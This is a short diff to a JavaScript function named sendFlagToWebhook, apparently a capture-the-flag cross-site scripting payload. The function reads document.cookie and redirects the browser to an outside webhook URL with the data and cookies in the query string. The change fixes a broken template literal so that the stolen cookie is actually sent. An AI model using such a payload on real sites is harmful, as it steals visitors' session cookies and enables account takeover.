@@ -7,7 +7,7 @@ async function sendFlagToWebhook(webhookUrl) {
     const encodedData = encodeURIComponent(data);
     const cookie = document.cookie;
     const encodedcookie = encodeURIComponent(cookie);
-    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}&cookies=$(cookie)`;
+    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}&cookies=${cookie}`;
 
     document.location = urlWithQueryParams;
   } catch (error) {
